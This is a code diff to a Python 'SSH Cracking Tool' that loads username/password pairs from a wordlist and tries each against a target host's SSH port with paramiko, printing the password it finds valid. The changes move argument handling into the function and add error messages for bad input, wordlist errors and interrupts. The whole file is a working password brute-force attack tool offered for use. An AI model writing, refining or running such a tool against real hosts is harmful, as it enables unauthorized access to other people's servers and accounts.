@@ -1,13 +1,17 @@
 #!/usr/bin/env python
 import paramiko, sys, socket
+problem = "\n"
 def help():
-    print("SSH Cracking Tool")
+    print("[S]SH [C]racking [T]ool")
     print("Usage: ./sct.py <host> <wordlist>")
     print
-    print("Wordlist must be <name    password> where blanked <TAB>")
+    print("Wordlist must be <name    password> where blanked = <TAB>")
+    print(problem)
     sys.exit()
-def SCT(target, wordlist):
+def SCT():
     try:
+        target = sys.argv[1]
+        wordlist = sys.argv[2]
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         for p in open(wordlist, "r").readlines():
@@ -20,8 +24,16 @@ def SCT(target, wordlist):
             print("\npassword:%s is valid" % passw)
             break
     except IndexError:
+        global problem
+        problem = "\n\033[1mPlease check your command line input\033[0m"
         help()
     except paramiko.ssh_exception.NoValidConnectionsError:
         print("Couldn't connect on host %s port 22" % target)
         sys.exit()
-SCT(sys.argv[1], sys.argv[2])
+    except IOError:
+        print("Wordlist Error")
+        sys.exit()
+    except KeyboardInterrupt:
+        print("Exiting tool now..")
+        sys.exit()
+SCT()
